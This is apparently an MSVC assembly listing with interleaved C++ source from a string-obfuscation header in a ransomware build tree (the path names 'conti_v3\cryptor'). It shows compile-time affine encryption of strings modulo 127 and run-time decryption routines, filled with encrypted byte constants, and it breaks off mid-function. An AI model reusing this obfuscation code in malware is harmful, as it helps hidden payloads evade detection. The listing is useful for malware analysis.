;	COMDAT ??0?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 2d	 mov	 BYTE PTR [rcx+1], 45	; 0000002dH
  00007	c6 41 02 54	 mov	 BYTE PTR [rcx+2], 84	; 00000054H
  0000b	c6 41 03 01	 mov	 BYTE PTR [rcx+3], 1
  0000f	c6 41 04 54	 mov	 BYTE PTR [rcx+4], 84	; 00000054H
  00013	c6 41 05 5c	 mov	 BYTE PTR [rcx+5], 92	; 0000005cH
  00017	c6 41 06 54	 mov	 BYTE PTR [rcx+6], 84	; 00000054H
  0001b	c6 41 07 67	 mov	 BYTE PTR [rcx+7], 103	; 00000067H
  0001f	c6 41 08 54	 mov	 BYTE PTR [rcx+8], 84	; 00000054H
  00023	c6 41 09 07	 mov	 BYTE PTR [rcx+9], 7
  00027	c6 41 0a 54	 mov	 BYTE PTR [rcx+10], 84	; 00000054H
  0002b	c6 41 0b 36	 mov	 BYTE PTR [rcx+11], 54	; 00000036H
  0002f	c6 41 0c 54	 mov	 BYTE PTR [rcx+12], 84	; 00000054H
  00033	c6 41 0d 1c	 mov	 BYTE PTR [rcx+13], 28
  00037	c6 41 0e 54	 mov	 BYTE PTR [rcx+14], 84	; 00000054H
  0003b	c6 41 0f 78	 mov	 BYTE PTR [rcx+15], 120	; 00000078H
  0003f	c6 41 10 54	 mov	 BYTE PTR [rcx+16], 84	; 00000054H
  00043	c6 41 11 39	 mov	 BYTE PTR [rcx+17], 57	; 00000039H
  00047	c6 41 12 54	 mov	 BYTE PTR [rcx+18], 84	; 00000054H
  0004b	c6 41 13 07	 mov	 BYTE PTR [rcx+19], 7
  0004f	c6 41 14 54	 mov	 BYTE PTR [rcx+20], 84	; 00000054H
  00053	c6 41 15 1d	 mov	 BYTE PTR [rcx+21], 29
  00057	c6 41 16 54	 mov	 BYTE PTR [rcx+22], 84	; 00000054H
  0005b	c6 41 17 36	 mov	 BYTE PTR [rcx+23], 54	; 00000036H
  0005f	c6 41 18 54	 mov	 BYTE PTR [rcx+24], 84	; 00000054H
  00063	c6 41 19 47	 mov	 BYTE PTR [rcx+25], 71	; 00000047H
  00067	c6 41 1a 54	 mov	 BYTE PTR [rcx+26], 84	; 00000054H
  0006b	c6 41 1b 1d	 mov	 BYTE PTR [rcx+27], 29
  0006f	c6 41 1c 54	 mov	 BYTE PTR [rcx+28], 84	; 00000054H
  00073	c6 41 1d 2a	 mov	 BYTE PTR [rcx+29], 42	; 0000002aH
  00077	c6 41 1e 54	 mov	 BYTE PTR [rcx+30], 84	; 00000054H
  0007b	c6 41 1f 36	 mov	 BYTE PTR [rcx+31], 54	; 00000036H
  0007f	c6 41 20 54	 mov	 BYTE PTR [rcx+32], 84	; 00000054H
  00083	c6 41 21 24	 mov	 BYTE PTR [rcx+33], 36	; 00000024H
  00087	c6 41 22 54	 mov	 BYTE PTR [rcx+34], 84	; 00000054H
  0008b	c6 41 23 63	 mov	 BYTE PTR [rcx+35], 99	; 00000063H
  0008f	c6 41 24 54	 mov	 BYTE PTR [rcx+36], 84	; 00000054H
  00093	c6 41 25 78	 mov	 BYTE PTR [rcx+37], 120	; 00000078H
  00097	c6 41 26 54	 mov	 BYTE PTR [rcx+38], 84	; 00000054H
  0009b	c6 41 27 36	 mov	 BYTE PTR [rcx+39], 54	; 00000036H
  0009f	c6 41 28 54	 mov	 BYTE PTR [rcx+40], 84	; 00000054H
  000a3	c6 41 29 24	 mov	 BYTE PTR [rcx+41], 36	; 00000024H
  000a7	c6 41 2a 54	 mov	 BYTE PTR [rcx+42], 84	; 00000054H
  000ab	c6 41 2b 39	 mov	 BYTE PTR [rcx+43], 57	; 00000039H
  000af	c6 41 2c 54	 mov	 BYTE PTR [rcx+44], 84	; 00000054H
  000b3	c6 41 2d 4e	 mov	 BYTE PTR [rcx+45], 78	; 0000004eH
  000b7	c6 41 2e 54	 mov	 BYTE PTR [rcx+46], 84	; 00000054H
  000bb	c6 41 2f 1d	 mov	 BYTE PTR [rcx+47], 29
  000bf	c6 41 30 54	 mov	 BYTE PTR [rcx+48], 84	; 00000054H
  000c3	c6 41 31 36	 mov	 BYTE PTR [rcx+49], 54	; 00000036H
  000c7	c6 41 32 54	 mov	 BYTE PTR [rcx+50], 84	; 00000054H
  000cb	c6 41 33 59	 mov	 BYTE PTR [rcx+51], 89	; 00000059H
  000cf	c6 41 34 54	 mov	 BYTE PTR [rcx+52], 84	; 00000054H
  000d3	c6 41 35 00	 mov	 BYTE PTR [rcx+53], 0
  000d7	c6 41 36 54	 mov	 BYTE PTR [rcx+54], 84	; 00000054H
  000db	c6 41 37 19	 mov	 BYTE PTR [rcx+55], 25
  000df	c6 41 38 54	 mov	 BYTE PTR [rcx+56], 84	; 00000054H
  000e3	c6 41 39 36	 mov	 BYTE PTR [rcx+57], 54	; 00000036H
  000e7	c6 41 3a 54	 mov	 BYTE PTR [rcx+58], 84	; 00000054H
  000eb	c6 41 3b 49	 mov	 BYTE PTR [rcx+59], 73	; 00000049H
  000ef	c6 41 3c 54	 mov	 BYTE PTR [rcx+60], 84	; 00000054H
  000f3	c6 41 3d 1d	 mov	 BYTE PTR [rcx+61], 29
  000f7	c6 41 3e 54	 mov	 BYTE PTR [rcx+62], 84	; 00000054H
  000fb	c6 41 3f 07	 mov	 BYTE PTR [rcx+63], 7
  000ff	c6 41 40 54	 mov	 BYTE PTR [rcx+64], 84	; 00000054H
  00103	c6 41 41 6c	 mov	 BYTE PTR [rcx+65], 108	; 0000006cH
  00107	c6 41 42 54	 mov	 BYTE PTR [rcx+66], 84	; 00000054H
  0010b	c6 41 43 01	 mov	 BYTE PTR [rcx+67], 1
  0010f	c6 41 44 54	 mov	 BYTE PTR [rcx+68], 84	; 00000054H
  00113	c6 41 45 00	 mov	 BYTE PTR [rcx+69], 0
  00117	c6 41 46 54	 mov	 BYTE PTR [rcx+70], 84	; 00000054H
  0011b	c6 41 47 07	 mov	 BYTE PTR [rcx+71], 7
  0011f	c6 41 48 54	 mov	 BYTE PTR [rcx+72], 84	; 00000054H
  00123	c6 41 49 3b	 mov	 BYTE PTR [rcx+73], 59	; 0000003bH
  00127	c6 41 4a 54	 mov	 BYTE PTR [rcx+74], 84	; 00000054H
  0012b	c6 41 4b 78	 mov	 BYTE PTR [rcx+75], 120	; 00000078H
  0012f	c6 41 4c 54	 mov	 BYTE PTR [rcx+76], 84	; 00000054H
  00133	c6 41 4d 78	 mov	 BYTE PTR [rcx+77], 120	; 00000078H
  00137	c6 41 4e 54	 mov	 BYTE PTR [rcx+78], 84	; 00000054H
  0013b	c6 41 4f 63	 mov	 BYTE PTR [rcx+79], 99	; 00000063H
  0013f	c6 41 50 54	 mov	 BYTE PTR [rcx+80], 84	; 00000054H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00143	c6 41 51 78	 mov	 BYTE PTR [rcx+81], 120	; 00000078H
  00147	c6 41 52 54	 mov	 BYTE PTR [rcx+82], 84	; 00000054H
  0014b	c6 41 53 36	 mov	 BYTE PTR [rcx+83], 54	; 00000036H
  0014f	c6 41 54 54	 mov	 BYTE PTR [rcx+84], 84	; 00000054H
  00153	c6 41 55 03	 mov	 BYTE PTR [rcx+85], 3
  00157	c6 41 56 54	 mov	 BYTE PTR [rcx+86], 84	; 00000054H
  0015b	c6 41 57 36	 mov	 BYTE PTR [rcx+87], 54	; 00000036H
  0015f	c6 41 58 54	 mov	 BYTE PTR [rcx+88], 84	; 00000054H
  00163	c6 41 59 59	 mov	 BYTE PTR [rcx+89], 89	; 00000059H
  00167	c6 41 5a 54	 mov	 BYTE PTR [rcx+90], 84	; 00000054H
  0016b	c6 41 5b 4e	 mov	 BYTE PTR [rcx+91], 78	; 0000004eH
  0016f	c6 41 5c 54	 mov	 BYTE PTR [rcx+92], 84	; 00000054H
  00173	c6 41 5d 0e	 mov	 BYTE PTR [rcx+93], 14
  00177	c6 41 5e 54	 mov	 BYTE PTR [rcx+94], 84	; 00000054H
  0017b	c6 41 5f 54	 mov	 BYTE PTR [rcx+95], 84	; 00000054H
  0017f	c6 41 60 54	 mov	 BYTE PTR [rcx+96], 84	; 00000054H
  00183	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]

; 52   :     {
; 53   : 
; 54   :     }

  00187	48 8b c1	 mov	 rax, rcx
  0018a	c3		 ret	 0
??0?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 60 00 00
	00		 mov	 r11d, 96		; 00000060H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 67	 sub	 ecx, 103		; 00000067H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::MetaBuffer<97,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 7d	 mov	 BYTE PTR [rcx+1], 125	; 0000007dH
  00007	c6 41 02 67	 mov	 BYTE PTR [rcx+2], 103	; 00000067H
  0000b	c6 41 03 72	 mov	 BYTE PTR [rcx+3], 114	; 00000072H
  0000f	c6 41 04 67	 mov	 BYTE PTR [rcx+4], 103	; 00000067H
  00013	c6 41 05 69	 mov	 BYTE PTR [rcx+5], 105	; 00000069H
  00017	c6 41 06 67	 mov	 BYTE PTR [rcx+6], 103	; 00000067H
  0001b	c6 41 07 4c	 mov	 BYTE PTR [rcx+7], 76	; 0000004cH
  0001f	c6 41 08 67	 mov	 BYTE PTR [rcx+8], 103	; 00000067H
  00023	c6 41 09 34	 mov	 BYTE PTR [rcx+9], 52	; 00000034H
  00027	c6 41 0a 67	 mov	 BYTE PTR [rcx+10], 103	; 00000067H
  0002b	c6 41 0b 20	 mov	 BYTE PTR [rcx+11], 32	; 00000020H
  0002f	c6 41 0c 67	 mov	 BYTE PTR [rcx+12], 103	; 00000067H
  00033	c6 41 0d 59	 mov	 BYTE PTR [rcx+13], 89	; 00000059H
  00037	c6 41 0e 67	 mov	 BYTE PTR [rcx+14], 103	; 00000067H
  0003b	c6 41 0f 70	 mov	 BYTE PTR [rcx+15], 112	; 00000070H
  0003f	c6 41 10 67	 mov	 BYTE PTR [rcx+16], 103	; 00000067H
  00043	c6 41 11 01	 mov	 BYTE PTR [rcx+17], 1
  00047	c6 41 12 67	 mov	 BYTE PTR [rcx+18], 103	; 00000067H
  0004b	c6 41 13 34	 mov	 BYTE PTR [rcx+19], 52	; 00000034H
  0004f	c6 41 14 67	 mov	 BYTE PTR [rcx+20], 103	; 00000067H
  00053	c6 41 15 79	 mov	 BYTE PTR [rcx+21], 121	; 00000079H
  00057	c6 41 16 67	 mov	 BYTE PTR [rcx+22], 103	; 00000067H
  0005b	c6 41 17 20	 mov	 BYTE PTR [rcx+23], 32	; 00000020H
  0005f	c6 41 18 67	 mov	 BYTE PTR [rcx+24], 103	; 00000067H
  00063	c6 41 19 44	 mov	 BYTE PTR [rcx+25], 68	; 00000044H
  00067	c6 41 1a 67	 mov	 BYTE PTR [rcx+26], 103	; 00000067H
  0006b	c6 41 1b 79	 mov	 BYTE PTR [rcx+27], 121	; 00000079H
  0006f	c6 41 1c 67	 mov	 BYTE PTR [rcx+28], 103	; 00000067H
  00073	c6 41 1d 1d	 mov	 BYTE PTR [rcx+29], 29
  00077	c6 41 1e 67	 mov	 BYTE PTR [rcx+30], 103	; 00000067H
  0007b	c6 41 1f 20	 mov	 BYTE PTR [rcx+31], 32	; 00000020H
  0007f	c6 41 20 67	 mov	 BYTE PTR [rcx+32], 103	; 00000067H
  00083	c6 41 21 5b	 mov	 BYTE PTR [rcx+33], 91	; 0000005bH
  00087	c6 41 22 67	 mov	 BYTE PTR [rcx+34], 103	; 00000067H
  0008b	c6 41 23 4b	 mov	 BYTE PTR [rcx+35], 75	; 0000004bH
  0008f	c6 41 24 67	 mov	 BYTE PTR [rcx+36], 103	; 00000067H
  00093	c6 41 25 70	 mov	 BYTE PTR [rcx+37], 112	; 00000070H
  00097	c6 41 26 67	 mov	 BYTE PTR [rcx+38], 103	; 00000067H
  0009b	c6 41 27 20	 mov	 BYTE PTR [rcx+39], 32	; 00000020H
  0009f	c6 41 28 67	 mov	 BYTE PTR [rcx+40], 103	; 00000067H
  000a3	c6 41 29 5b	 mov	 BYTE PTR [rcx+41], 91	; 0000005bH
  000a7	c6 41 2a 67	 mov	 BYTE PTR [rcx+42], 103	; 00000067H
  000ab	c6 41 2b 01	 mov	 BYTE PTR [rcx+43], 1
  000af	c6 41 2c 67	 mov	 BYTE PTR [rcx+44], 103	; 00000067H
  000b3	c6 41 2d 26	 mov	 BYTE PTR [rcx+45], 38	; 00000026H
  000b7	c6 41 2e 67	 mov	 BYTE PTR [rcx+46], 103	; 00000067H
  000bb	c6 41 2f 79	 mov	 BYTE PTR [rcx+47], 121	; 00000079H
  000bf	c6 41 30 67	 mov	 BYTE PTR [rcx+48], 103	; 00000067H
  000c3	c6 41 31 20	 mov	 BYTE PTR [rcx+49], 32	; 00000020H
  000c7	c6 41 32 67	 mov	 BYTE PTR [rcx+50], 103	; 00000067H
  000cb	c6 41 33 09	 mov	 BYTE PTR [rcx+51], 9
  000cf	c6 41 34 67	 mov	 BYTE PTR [rcx+52], 103	; 00000067H
  000d3	c6 41 35 52	 mov	 BYTE PTR [rcx+53], 82	; 00000052H
  000d7	c6 41 36 67	 mov	 BYTE PTR [rcx+54], 103	; 00000067H
  000db	c6 41 37 78	 mov	 BYTE PTR [rcx+55], 120	; 00000078H
  000df	c6 41 38 67	 mov	 BYTE PTR [rcx+56], 103	; 00000067H
  000e3	c6 41 39 20	 mov	 BYTE PTR [rcx+57], 32	; 00000020H
  000e7	c6 41 3a 67	 mov	 BYTE PTR [rcx+58], 103	; 00000067H
  000eb	c6 41 3b 05	 mov	 BYTE PTR [rcx+59], 5
